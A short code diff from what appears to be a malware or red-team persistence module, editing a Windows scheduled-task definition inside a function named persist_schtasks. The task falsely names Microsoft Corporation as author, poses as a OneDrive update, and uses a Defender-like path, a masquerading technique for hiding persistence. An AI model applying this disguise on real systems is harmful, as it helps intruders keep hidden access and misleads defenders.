@@ -256,7 +256,7 @@ def persist_schtasks():
 <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
     <RegistrationInfo>
         <Author>Microsoft Corporation</Author>
-        <Description>OneDrive Standalone Update</Description>
+        <Description>OneDrive Standalone Update Handler</Description>
         <URI>\Microsoft\Windows\Defender\HealthMonitor</URI>
         <Date>2024-01-01T00:00:00</Date>
     </RegistrationInfo>
